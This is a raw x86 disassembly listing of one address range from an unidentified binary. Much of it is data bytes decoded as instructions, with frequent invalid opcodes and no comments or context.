  433fe6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433fed:	mov    ecx,DWORD PTR [ebp-0x10]
  433ff0:	xor    ecx,DWORD PTR [ebp+0x3]
  433ff3:	mov    edi,DWORD PTR [ebx]
  433ff5:	adc    BYTE PTR [ebp+0x41],dh
  433ff8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  433ffe:	ret    
  433fff:	push   ss
  434000:	push   0x45
  434002:	lea    ecx,[ebx+0x4de80cb0]
  434008:	sti    
  434009:	add    edi,edi
  43400b:	or     BYTE PTR [ebp+0x4d],al
  43400e:	mov    ebp,DWORD PTR [ebx]
  434010:	xor    ebp,ecx
  434012:	mov    al,BYTE PTR [edx]
  434014:	add    eax,0xc7200
  434019:	jne    0x434068
  43401b:	lea    esi,[ebx]
  43401d:	mov    al,0xf
  43401f:	call   0xf36e4
  434024:	shl    DWORD PTR [esi],0x84
  434027:	pushf  
  434028:	add    DWORD PTR [ecx+0x4545d000],ecx
  43402e:	mov    edi,DWORD PTR [ecx]
  434030:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  434037:	test   DWORD PTR [eax],eax
  434039:	clc    
  43403a:	dec    ebp
  43403b:	inc    ebp
  43403c:	xor    edi,DWORD PTR [ebx]
  43403e:	setl   al
  434041:	(bad)  
  434042:	retf   
  434043:	rol    cl,1
  434045:	dec    ebp
  434046:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43404c:	inc    ebp
  43404d:	lea    ecx,[ebx-0x75b2cc38]
  434053:	lea    eax,ds:0x4d72c4
  434059:	mov    ecx,DWORD PTR [ebp-0x4]
  43405c:	xor    ecx,edi
  43405e:	bswap  ebx
  434060:	ror    BYTE PTR [ebp-0x35],0xe9
  434064:	rol    DWORD PTR [ecx],0x84
  434067:	add    BYTE PTR [ecx],al
  434069:	cmp    BYTE PTR [eax],al
  43406b:	pushf  
  43406c:	inc    ebp
  43406d:	jnp    0x8a437470
  434073:	mov    eax,DWORD PTR ds:0xcf72e8
  434079:	lock dec ebp
  43407b:	retf   
  43407c:	xor    ecx,DWORD PTR [ebp+0xf]
  43407f:	mov    eax,eax
  434081:	fmul   st,st(3)
  434083:	test   ecx,0x1998484
  434089:	xor    al,BYTE PTR [eax]
  43408b:	mov    DWORD PTR [ebp-0x28],eax
  43408e:	mov    eax,DWORD PTR [ebp+0x33]
  434091:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434097:	ret    
  434098:	add    al,cl
  43409a:	dec    ebp
  43409b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4340a1:	add    ecx,DWORD PTR ds:0xc7250
  4340a7:	inc    ebp
  4340a8:	rcl    DWORD PTR [eax+0x4d],0x2b
  4340ac:	mov    edi,edi
  4340ae:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4340b4:	jb     0x43407d
  4340b6:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4340bd:	mov    esi,DWORD PTR [ebx]
  4340bf:	cld    
  4340c0:	mov    cl,bh
  4340c2:	or     eax,0x372b6
  4340c7:	cmp    ecx,eax
  4340c9:	jne    0x434146
  4340cf:	mov    eax,DWORD PTR [ebp-0x20]
  4340d2:	mov    eax,DWORD PTR [eax]
  4340d4:	xor    eax,edi
  4340d6:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4340dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4340e0:	mov    ecx,edi
  4340e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4340e8:	jb     0x4340f9
  4340ea:	add    BYTE PTR [edi-0x3f],dl
  4340ed:	add    BYTE PTR [ebp-0x75],cl
  4340f0:	mov    esi,eax
  4340f2:	xor    eax,DWORD PTR [eax]
  4340f4:	mov    al,bh
  4340f6:	or     eax,0x497284
  4340fb:	xor    al,cl
  4340fd:	mov    ecx,DWORD PTR [ebp-0x4]
  434100:	mov    ecx,edi
  434102:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434108:	jb     0x434119
  43410a:	add    BYTE PTR [edi],dh
  43410c:	enter  0x8500,0x8b
  434110:	add    ah,bl
  434112:	add    BYTE PTR [eax],al
  434114:	inc    ebp
  434115:	(bad)  
  434116:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43411d:	mov    esi,DWORD PTR [edx-0x4]
  434120:	add    bh,cl
  434122:	dec    ebp
  434123:	mov    dh,0x8b
  434125:	add    esi,DWORD PTR [ebx]
  434127:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43412d:	add    BYTE PTR [eax],al
  43412f:	mov    eax,ecx
  434131:	loopne 0x434180
  434133:	add    BYTE PTR [ebx-0x757bcc39],cl
  434139:	dec    ecx
  43413a:	or     eax,0x8b7232
  43413f:	in     al,0xc1
  434141:	or     DWORD PTR [ebp-0x31],ecx
  434144:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  43414b:	xor    dh,BYTE PTR [edx-0x75]
  43414e:	add    al,dh
  434150:	enter  0x4f09,0xcf
  434154:	inc    ebp
  434155:	mov    WORD PTR [ebx-0x75cdccb7],cs
  43415b:	or     al,BYTE PTR ds:0xe4728b
  434161:	or     DWORD PTR [ebp-0x31],ecx
  434164:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  43416b:	cmp    dh,BYTE PTR [edx+0xf]
  43416e:	add    bl,dl
  434170:	rol    DWORD PTR [eax],0x4d
  434173:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  434179:	(bad)  
  43417a:	or     eax,0x497284
  43417f:	xor    al,cl
  434181:	mov    ecx,DWORD PTR [ebp-0x20]
  434184:	mov    ecx,DWORD PTR [ecx]
  434186:	xor    ecx,edi
  434188:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43418f:	xor    cl,al
  434191:	mov    ecx,DWORD PTR [edi]
  434193:	fadd   QWORD PTR [ebp+0x9]
  434196:	call   0xffd03c6a
  43419b:	dec    ecx
  43419c:	dec    ebp
  43419d:	xor    bh,BYTE PTR [ebx]
  43419f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4341a3:	loopne 0x4341a1
  4341a5:	or     edi,eax
  4341a7:	iret   
  4341a8:	ret    
  4341a9:	mov    WORD PTR [ebp+0x4d],es
  4341ac:	mov    esi,DWORD PTR [edx]
  4341ae:	call   0x845308ed
  4341b3:	(bad)  
  4341b4:	cdq    
  4341b5:	add    BYTE PTR [edx],dh
  4341b7:	mov    esi,DWORD PTR [ebx]
  4341b9:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4341bf:	test   BYTE PTR [ebx],dh
  4341c1:	dec    ecx
  4341c2:	add    esi,DWORD PTR [edx]
  4341c4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4341ca:	dec    edi
  4341cc:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  4341d3:	xor    al,BYTE PTR [ebx]
  4341d5:	mov    edi,DWORD PTR [ebx]
  4341d7:	in     al,0x75
  4341d9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4341df:	dec    ecx
  4341e0:	xor    esi,DWORD PTR [edx]
  4341e2:	lea    ecx,[edx]
  4341e4:	or     BYTE PTR [ebx+0x900f072],cl
  4341ea:	ja     0x4341bb
  4341ec:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  4341f3:	cmp    ch,al
  4341f5:	jne    0x4341ea
  4341f7:	mov    edi,edi
  4341f9:	fadd   QWORD PTR [ebp+0x0]
  4341fc:	mov    eax,edi
  4341fe:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434205:	mov    edx,DWORD PTR [ebx]
  434207:	in     al,0x45
  434209:	or     DWORD PTR [ebx],esi
  43420b:	iret   
  43420c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434213:	xor    dl,BYTE PTR [eax-0x75]
  434216:	sbb    al,0xe0
  434218:	dec    DWORD PTR [ecx]
  43421a:	mov    ecx,edi
  43421c:	in     al,dx
  43421d:	mov    eax,es
  43421f:	dec    ecx
  434220:	mov    DWORD PTR [edx],esi
  434222:	fmul   QWORD PTR [edx]
  434224:	jne    0x4341b1
  434226:	(bad)  
  434227:	(bad)  
  434229:	or     DWORD PTR [ebp-0x31],eax
  43422c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  434233:	cmp    bh,bh
  434235:	jne    0x43427c
  434237:	lea    ecx,[ebx-0x38372750]
  43423d:	inc    ebx
  43423f:	mov    eax,ecx
  434241:	mov    eax,0xa00c111
  434246:	jne    0x43428d
  434248:	mov    esi,DWORD PTR [ebx]
  43424a:	test   al,0x3
  43424c:	inc    ebp
  43424d:	mov    DWORD PTR [eax-0xc],edx
  434250:	loop   0x434297
  434252:	push   DWORD PTR [ebx]
  434254:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43425a:	add    DWORD PTR [eax],eax
  43425c:	mov    eax,edi
  43425e:	lods   al,BYTE PTR ds:[esi]
  43425f:	dec    ebp
  434260:	inc    ebp
  434261:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  434267:	retf   
  434268:	mov    edx,ecx
  43426a:	adc    al,0x84
  43426c:	(bad)  
  43426d:	std    
  43426e:	ret    
  43426f:	jmp    FWORD PTR [edi-0x2b7474bb]
  434275:	hlt    
  434276:	rol    edi,0x82
  434279:	ret    
  43427a:	cld    
  43427b:	enter  0x11ff,0x45
  43427f:	inc    ebp
  434280:	pop    edi
  434281:	mov    ebx,DWORD PTR [ebx+0x14]
  434284:	ret    0xc7
  434287:	test   BYTE PTR [ebx+0x45325199],cl
  43428d:	jmp    0x43421a
  43428f:	push   0x8
  434291:	call   DWORD PTR [esi]
  434293:	in     al,dx
  434294:	add    BYTE PTR [ebp+0x1],0x50
  434298:	add    bh,ah
  43429a:	add    bh,bh
  43429c:	icebp  
  43429d:	mov    ecx,DWORD PTR [eax]
  43429f:	cld    
  4342a0:	pop    es
  4342a1:	dec    ebp
  4342a2:	shl    DWORD PTR [ebx],0x72
  4342a5:	add    eax,DWORD PTR [eax]
  4342a7:	cmp    edx,ecx
  4342a9:	je     0x4342bb
  4342ab:	mov    esi,DWORD PTR [ebp-0x4]
  4342ae:	inc    edi
  4342b0:	or     al,0xc3
  4342b2:	jmp    FWORD PTR [edx-0x18]
  4342b5:	(bad)  
  4342b6:	sti    
  4342b7:	cwde   
  4342b8:	(bad)  
  4342b9:	call   0xffa13bc4
  4342be:	or     al,0x45
  4342c0:	push   ebp
  4342c1:	sub    esp,0x18
  4342c4:	push   ebx
  4342c5:	inc    ebp
  4342c6:	mov    edi,edi
  4342c8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4342cf:	test   al,0x51
  4342d1:	inc    ebp
  4342d2:	push   ecx
  4342d3:	push   eax
  4342d4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4342da:	add    ah,bh
  4342dc:	(bad)  
  4342dd:	dec    ebp
  4342de:	add    DWORD PTR [ebx],esi
  4342e0:	inc    ebp
  4342e1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4342e7:	push   0xffffff8b
  4342e9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4342ef:	add    eax,DWORD PTR [ecx]
  4342f1:	or     BYTE PTR [eax],al
  4342f3:	call   0xff853af8
  4342f8:	mov    eax,DWORD PTR [ebp+0x14]
  4342fb:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434301:	inc    ebp
  434302:	dec    ecx
  434303:	add    ebp,DWORD PTR [edx+0x14]
  434306:	push   0x8b3045
  43430b:	call   0x33ad9080
  434310:	inc    DWORD PTR [ebx]
  434312:	mov    DWORD PTR [edi],ecx
  434314:	mov    eax,ecx
  434316:	or     BYTE PTR [ebp-0x3d],cl
  434319:	cmp    eax,edi
  43431b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  434320:	adc    BYTE PTR [ebx+0x5eff0845],cl
  434326:	adc    al,0xc9
  434328:	inc    ebp
  434329:	adc    BYTE PTR [eax+0x55],dl
  43432c:	jne    0x43431a
  43432e:	call   0xff5442be
  434333:	dec    ebp
  434334:	inc    ebp
  434335:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43433b:	add    BYTE PTR [ebx],bh
  43433d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  434341:	push   ecx
  434342:	or     al,0x51
  434344:	dec    ebp
  434345:	xor    DWORD PTR [ebx],0xf320399
  43434b:	cmp    eax,DWORD PTR [ebp+0x74]
  43434e:	mov    edi,edi
  434350:	pop    edi
  434351:	adc    BYTE PTR [ebx+0x75],bl
  434354:	ret    0x50
  434357:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43435b:	(bad)  
  43435c:	clc    
  43435d:	mov    esp,ebp
  43435f:	pop    ecx
  434360:	mov    ecx,0xf80085c2
  434365:	mov    ecx,DWORD PTR [ecx+edx*2]
  434368:	push   esi
  434369:	push   esi
  43436a:	(bad)  
  43436b:	lock add eax,DWORD PTR [ebp+0x44]
  43436f:	mov    edx,DWORD PTR [eax]
  434371:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  434375:	or     BYTE PTR [ecx+0x7],dl
  434378:	push   ecx
  434379:	ret    
  43437a:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434380:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434386:	or     al,0x80
  434388:	jge    0x43438b
  43438a:	mov    DWORD PTR [eax],eax
  43438c:	and    al,0x8
  43438e:	cmp    DWORD PTR [ebp+0x10],eax
  434391:	mov    edx,DWORD PTR [esi]
  434393:	xchg   esp,eax
  434394:	dec    esp
  434395:	add    BYTE PTR [eax],dl
  434397:	mov    ecx,edx
  434399:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43439d:	dec    ebp
  43439e:	into   
  43439f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4343a5:	mov    edx,DWORD PTR [eax+0x14]
  4343a8:	das    
  4343a9:	add    al,0x45
  4343ab:	add    BYTE PTR [ebp+0x0],dh
  4343ae:	mov    edi,edi
  4343b0:	and    al,0x50
  4343b2:	mov    eax,DWORD PTR [eax]
  4343b4:	and    al,0xd1
  4343b6:	xor    eax,DWORD PTR [esi]
  4343b8:	lea    eax,[ebp+0x8]
  4343bb:	xor    esi,DWORD PTR [edx+0x3]
  4343be:	add    BYTE PTR [ecx+0x4510fc44],cl
  4343c4:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  4343ca:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4343d4:	cmp    edi,edi
  4343d6:	pushf  
  4343d7:	mov    edi,edi
  4343d9:	or     BYTE PTR [esi+ecx*1],cl
  4343dc:	jne    0x4343a1
  4343de:	call   0xc43aa
  4343e3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4343e7:	mov    ebx,DWORD PTR [eax]
  4343e9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4343ed:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4343f5:	pop    esi
  4343f6:	(bad)  
  4343f7:	leave  
  4343f8:	call   DWORD PTR [eax]
  4343fa:	call   DWORD PTR [ebp+0x24]
  4343fd:	in     al,dx
  4343fe:	jmp    esp
  434400:	and    al,0x83
  434402:	call   0xff7a4217
  434407:	pushf  
  434408:	inc    esp
  434409:	mov    DWORD PTR [esp],ecx
  43440c:	pop    esi
  43440d:	push   edi
  43440e:	in     eax,0x41
  434410:	ret    0x89
  434413:	and    al,0xe
  434415:	mov    edi,DWORD PTR [eax]
  434417:	and    al,0x75
  434419:	mov    edx,0x7750885
  43441e:	or     dl,bh
  434420:	call   FWORD PTR [ecx+0x3243224]
  434426:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  43442c:	dec    DWORD PTR [esp]
  43442f:	jl     0x4343bc
  434431:	adc    al,0xc
  434433:	dec    ebp
  434434:	cmp    DWORD PTR [ebp+0x1c],esi
  434437:	mov    ecx,DWORD PTR [eax]
  434439:	and    al,0x10
  43443b:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  434442:	test   DWORD PTR [edi],ecx
  434444:	jge    0x434410
  434446:	push   0x8908ff4c
  43444b:	jmp    0x434471
  43444d:	adc    BYTE PTR [esp+eax*2-0x75],dh
  434451:	dec    esp
  434452:	pop    ebp
  434453:	ret    0x8999
  434456:	push   0x74f89cf8
  43445b:	jmp    0x4344d1
  43445d:	mov    edi,0x104fd55f
  434462:	add    BYTE PTR [eax],dh
  434464:	adc    BYTE PTR ds:[eax],al
  434467:	or     edx,DWORD PTR gs:[eax]
  43446a:	add    BYTE PTR [ecx],ch
  43446c:	add    eax,0x35270010
  434471:	adc    BYTE PTR [eax],al
  434473:	std    
  434474:	dec    eax
  434475:	adc    BYTE PTR [eax],al
  434477:	(bad)  
  434478:	outs   dx,BYTE PTR ds:[esi]
  434479:	adc    BYTE PTR [eax],al
  43447b:	sahf   
  43447c:	xor    DWORD PTR [eax],edx
  43447e:	add    BYTE PTR [esi+0x0],al
  434481:	adc    BYTE PTR [eax],al
  434483:	fs jae 0x434496
  434486:	add    BYTE PTR [ebx+0x5f001054],bh
  43448c:	inc    esp
  43448d:	inc    ebx
  43448e:	add    BYTE PTR [ebx+0x44],ah
  434491:	inc    ebx
  434492:	add    BYTE PTR [edi+0x44],ah
  434495:	inc    ebx
  434496:	add    BYTE PTR [ebx+0x44],ch
  434499:	inc    ebx
  43449a:	add    BYTE PTR [edi+0x44],ch
  43449d:	inc    ebx
  43449e:	add    BYTE PTR [ebx+0x44],dh
  4344a1:	inc    ebx
  4344a2:	add    BYTE PTR [edi+0x44],dh
  4344a5:	inc    ebx
  4344a6:	add    BYTE PTR [ebx+0x44],bh
  4344a9:	inc    ebx
  4344aa:	add    BYTE PTR [edi+0x44],bh
  4344ad:	inc    ebx
  4344ae:	add    BYTE PTR [ebx-0x78ffbcbc],al
  4344b4:	inc    esp
  4344b5:	inc    ebx
  4344b6:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  4344bd:	adc    BYTE PTR [eax],al
  4344bf:	adc    dh,BYTE PTR [ecx+0x10]
  4344c2:	add    BYTE PTR [edi+0x2c001065],al
  4344c8:	push   0x5aa20010
  4344cd:	adc    BYTE PTR [eax],al
  4344cf:	rol    DWORD PTR [eax+edx*1],0x0
  4344d3:	int    0x6f
  4344d5:	adc    BYTE PTR [eax],al
  4344d7:	mov    bh,0x44
  4344d9:	inc    ebx
  4344da:	add    BYTE PTR [ebx-0x40ffbcbc],bh
  4344e0:	inc    esp
  4344e1:	inc    ebx
  4344e2:	add    bl,al
  4344e4:	inc    esp
  4344e5:	inc    ebx
  4344e6:	add    bh,al
  4344e8:	inc    esp
  4344e9:	inc    ebx
  4344ea:	add    bl,cl
  4344ec:	inc    esp
  4344ed:	inc    ebx
  4344ee:	add    bh,cl
  4344f0:	inc    esp
  4344f1:	inc    ebx
  4344f2:	add    bl,dl
  4344f4:	inc    esp
  4344f5:	inc    ebx
  4344f6:	add    BYTE PTR [ebx+0x54001005],dh
  4344fc:	push   ebp
  4344fd:	adc    BYTE PTR [eax],al
  4344ff:	sbb    bh,BYTE PTR [eax]
  434501:	adc    BYTE PTR [eax],al
  434503:	mov    edx,0x2f001013
  434508:	dec    edx
  434509:	adc    BYTE PTR [eax],al
  43450b:	inc    ecx
  43450c:	or     edx,DWORD PTR [eax]
  43450e:	add    BYTE PTR [ebx+0x19],ch
  434511:	adc    BYTE PTR [eax],al
  434513:	mov    esp,0xf700103e
  434518:	inc    esp
  434519:	inc    ebx
  43451a:	add    bl,bh
  43451c:	inc    esp
  43451d:	inc    ebx
  43451e:	add    bh,bh
  434520:	inc    esp
  434521:	inc    ebx
  434522:	add    BYTE PTR [ebx],al
  434524:	inc    ebp
  434525:	inc    ebx
  434526:	add    BYTE PTR [edi],al
  434528:	inc    ebp
  434529:	inc    ebx
  43452a:	add    BYTE PTR [ebx],cl
  43452c:	inc    ebp
  43452d:	inc    ebx
  43452e:	add    BYTE PTR [edi],cl
  434530:	inc    ebp
  434531:	inc    ebx
  434532:	add    BYTE PTR [ebx],dl
  434534:	inc    ebp
  434535:	inc    ebx
  434536:	add    BYTE PTR [edi-0x27ffef96],ch
  43453c:	imul   edx,DWORD PTR [eax],0x0
  43453f:	sahf   
  434540:	push   ss
  434541:	adc    BYTE PTR [eax],al
  434543:	jle    0x43457f
  434545:	adc    BYTE PTR [eax],al
  434547:	jbe    0x43455e
  434549:	adc    BYTE PTR [eax],al
  43454b:	cmp    DWORD PTR [edi+0x10],edx
  43454e:	add    BYTE PTR [ebp+0x59001066],bl
  434554:	adc    al,0x10
  434556:	add    BYTE PTR [edi],dh
  434558:	inc    ebp
  434559:	inc    ebx
  43455a:	add    BYTE PTR [ebx],bh
  43455c:	inc    ebp
  43455d:	inc    ebx
  43455e:	add    BYTE PTR [edi],bh
  434560:	inc    ebp
  434561:	inc    ebx
  434562:	add    BYTE PTR [ebx+0x45],al
  434565:	inc    ebx
  434566:	add    BYTE PTR [edi+0x45],al
  434569:	inc    ebx
  43456a:	add    BYTE PTR [ebx+0x45],cl
  43456d:	inc    ebx
  43456e:	add    BYTE PTR [edi+0x45],cl
  434571:	inc    ebx
  434572:	add    BYTE PTR [ebx+0x45],dl
  434575:	inc    ebx
  434576:	add    BYTE PTR [ebx-0x6affef90],bh
  43457c:	inc    ebp
  43457d:	adc    BYTE PTR [eax],al
  43457f:	dec    ebx
  434580:	dec    eax
  434581:	adc    BYTE PTR [eax],al
  434583:	dec    ebx
  434584:	popa   
  434585:	adc    BYTE PTR [eax],al
  434587:	adc    al,BYTE PTR [eax+edx*1]
  43458a:	add    dh,dl
  43458c:	push   ds
  43458d:	adc    BYTE PTR [eax],al
  43458f:	hlt    
  434590:	pop    ds
  434591:	adc    BYTE PTR [eax],al
  434593:	dec    ecx
  434594:	pop    eax
  434595:	adc    BYTE PTR [eax],al
  434597:	ja     0x4345de
  434599:	inc    ebx
  43459a:	add    BYTE PTR [ebx+0x45],bh
  43459d:	inc    ebx
  43459e:	add    BYTE PTR [edi+0x45],bh
  4345a1:	inc    ebx
  4345a2:	add    BYTE PTR [ebx-0x78ffbcbb],al
  4345a8:	inc    ebp
  4345a9:	inc    ebx
  4345aa:	add    BYTE PTR [ebx-0x70ffbcbb],cl
  4345b0:	inc    ebp
  4345b1:	inc    ebx
  4345b2:	add    BYTE PTR [ebx+0x4d004345],dl
  4345b8:	push   edi
  4345b9:	xor    DWORD PTR [ecx],esi
  4345bb:	cmp    BYTE PTR [edi+ebx*2],dh
  4345be:	push   ecx
  4345bf:	add    BYTE PTR [edx+0x33],dl
  4345c2:	push   esi
  4345c3:	xor    eax,0x3849515f
  4345c8:	xor    al,0x59
  4345ca:	push   edi
  4345cb:	add    BYTE PTR [ebx+0x54],al
  4345ce:	inc    ebp
  4345cf:	pop    edi
  4345d0:	dec    ebx
  4345d1:	push   edx
  4345d2:	push   ebp
  4345d3:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  4345d8:	pop    edi
  4345d9:	aaa    
  4345da:	xor    al,0x32
  4345dc:	xor    BYTE PTR [edi+0x5f],al
  4345df:	inc    ebx
  4345e0:	pop    edx
  4345e1:	add    BYTE PTR [edi+0x4e],al
  4345e4:	cmp    DWORD PTR [edi+0x47],ebx
  4345e7:	push   ebx
  4345e8:	cmp    DWORD PTR [edi+0x4e],edx
  4345eb:	add    BYTE PTR [ecx+0x44],dl
  4345ee:	cmp    BYTE PTR [edi+0x33],bl
  4345f1:	cmp    BYTE PTR [eax],dh
  4345f3:	pop    edi
  4345f4:	inc    ecx
  4345f5:	dec    edi
  4345f6:	inc    esi
  4345f7:	push   eax
  4345f8:	add    BYTE PTR [edx+0x43],dl
  4345fb:	xor    eax,0x41305f30
  434600:	xor    BYTE PTR [esi+0x5f],al
  434603:	inc    ebx
  434604:	xor    dh,BYTE PTR [edx]
  434606:	xor    eax,0x36545200
  43460b:	xor    al,0x5f
  43460d:	dec    esi
  43460e:	xor    esi,DWORD PTR [edx]
  434610:	add    BYTE PTR ss:[eax+0x4b],cl
  434614:	inc    ebx
  434615:	pop    edi
  434616:	ss xor al,0x34
  434619:	pop    edi
  43461a:	inc    ecx
  43461b:	push   esp
  43461c:	dec    edi
  43461d:	add    BYTE PTR [esi+0x52],dl
  434620:	push   esi
  434621:	pop    edi
  434622:	inc    esi
  434623:	push   ecx
  434624:	push   ebp
  434625:	push   edx
  434626:	dec    eax
  434627:	add    BYTE PTR [esi+0x41],cl
  43462a:	inc    edx
  43462b:	pop    edi
  43462c:	xor    DWORD PTR [ecx],edi
  43462e:	push   edi
  43462f:	pop    edi
  434630:	pop    edx
  434631:	xor    eax,0x47003934
  434636:	push   edx
  434637:	push   ebp
  434638:	pop    edi
  434639:	xor    al,BYTE PTR [edx+0x30]
  43463c:	push   ebx
  43463d:	dec    esi
  43463e:	xor    eax,0x38564300
  434643:	xor    al,0x5f
  434645:	xor    bl,BYTE PTR [eax+0x36]
  434648:	inc    edx
  434649:	pop    edi
  43464a:	pop    ecx
  43464b:	xor    al,BYTE PTR [ecx+0x0]
  43464e:	push   edi
  43464f:	dec    ecx
  434650:	push   ebx
  434651:	xor    DWORD PTR [eax],edi
  434653:	pop    edi
  434654:	push   ecx
  434655:	xor    BYTE PTR [edx+0x5f],cl
  434658:	inc    ecx
  434659:	add    BYTE PTR ss:[edx+0x45],al
  43465d:	push   edi
  43465e:	cmp    DWORD PTR [eax],edi
  434660:	pop    edi
  434661:	inc    edx
  434662:	xor    eax,0x36520057
  434667:	aaa    
  434668:	xor    BYTE PTR [edi],dh
  43466a:	pop    edi
  43466b:	inc    edx
  43466c:	cmp    DWORD PTR [edi+0x52],eax
  43466f:	dec    esp
  434670:	pop    edi
  434671:	dec    ebx
  434672:	add    BYTE PTR [esp+edx*2+0x30],al
  434676:	pop    edi
  434677:	push   ebp
  434678:	push   ebx
  434679:	aaa    
  43467a:	dec    ebp
  43467b:	pop    edi
  43467c:	xor    ecx,DWORD PTR [edx+0x4e]
  43467f:	dec    ebx
  434680:	dec    edx
  434681:	add    BYTE PTR [edi+0x47],al
  434684:	xor    eax,0x534e5f32
  434689:	push   esp
  43468a:	pop    edi
  43468b:	push   esp
  43468c:	inc    edx
  43468d:	inc    esi
  43468e:	inc    esp
  43468f:	add    BYTE PTR [ebp+0x4e],al
  434692:	inc    edi
  434693:	cmp    DWORD PTR [edi+0x57],ebx
  434696:	push   eax
  434697:	push   ecx
  434698:	pop    edi
  434699:	dec    edi
  43469a:	inc    ebx
  43469b:	push   edi
  43469c:	pop    edi
  43469d:	inc    edi
  43469e:	add    BYTE PTR [edi+0x45],dl
  4346a1:	inc    esi
  4346a2:	pop    edi
  4346a3:	push   edx
  4346a4:	inc    edx
  4346a5:	pop    eax
  4346a6:	inc    edi
  4346a7:	ss pop edi
  4346a9:	push   esi
  4346aa:	inc    ebx
  4346ab:	dec    esi
  4346ac:	inc    esp
  4346ad:	add    BYTE PTR [edi+0x4d],cl
  4346b0:	inc    edi
  4346b1:	xor    ebx,DWORD PTR [edi+0x34]
  4346b4:	dec    esi
  4346b5:	pop    edx
  4346b6:	cmp    BYTE PTR [edi+0x58],bl
  4346b9:	cmp    BYTE PTR [eax],al
  4346bb:	push   edx
  4346bc:	pop    eax
  4346bd:	push   ecx
  4346be:	pop    edi
  4346bf:	dec    esp
  4346c0:	push   edx
  4346c1:	dec    ecx
  4346c2:	dec    edi
  4346c3:	inc    esp
  4346c4:	pop    edi
  4346c5:	dec    edi
  4346c6:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  4346ca:	push   eax
  4346cb:	inc    ebp
  4346cc:	pop    edi
  4346cd:	xor    eax,0x565f3945
  4346d2:	add    BYTE PTR [edi+0x4e],al
  4346d5:	push   esi
  4346d6:	pop    edi
  4346d7:	inc    edi
  4346d8:	push   esp
  4346d9:	dec    eax
  4346da:	xor    dh,BYTE PTR [ecx]
  4346dc:	pop    edi
  4346dd:	dec    edi
  4346de:	xor    eax,DWORD PTR ss:[eax]
  4346e1:	inc    esp
  4346e2:	inc    ebp
  4346e3:	dec    ecx
  4346e4:	pop    edi
  4346e5:	push   edx
  4346e6:	dec    eax
  4346e7:	xor    al,0x48
  4346e9:	dec    ecx
  4346ea:	ss pop edi
  4346ec:	aaa    
  4346ed:	aaa    
  4346ee:	dec    ecx
  4346ef:	dec    ebp
  4346f0:	add    BYTE PTR [eax+0x54],cl
  4346f3:	ss pop edi
  4346f5:	inc    esi
  4346f6:	inc    edx
  4346f7:	xor    dh,BYTE PTR [eax+eax*1]
  4346fa:	dec    esi
  4346fb:	ss dec edx
  4346fd:	pop    edi
  4346fe:	dec    ecx
  4346ff:	dec    esp
  434700:	inc    edi
  434701:	inc    esp
  434702:	dec    eax
  434703:	xor    BYTE PTR [eax],bh
  434705:	xor    eax,0x34004f00
  43470a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43470e:	add    BYTE PTR [edi],dh
  434710:	add    BYTE PTR [eax],dh
  434712:	add    BYTE PTR [edi+0x0],bl
  434715:	inc    esp
  434716:	add    BYTE PTR [edi+0x0],al
  434719:	dec    ebx
  43471a:	add    BYTE PTR [edx],dh
  43471c:	add    BYTE PTR [ecx+0x0],al
  43471f:	inc    ebx
  434720:	add    BYTE PTR [eax],al
  434722:	add    BYTE PTR [edi+0x0],cl
  434725:	xor    al,BYTE PTR [eax]
  434727:	xor    eax,DWORD PTR [eax]
  434729:	pop    edi
  43472a:	add    BYTE PTR [edi+0x0],dl
  43472d:	xor    al,BYTE PTR [eax]
  43472f:	dec    edi
  434730:	add    BYTE PTR [edi+0x0],bl
  434733:	pop    edx
  434734:	add    BYTE PTR [eax],al
  434736:	add    BYTE PTR [eax+0x0],bl
  434739:	dec    esp
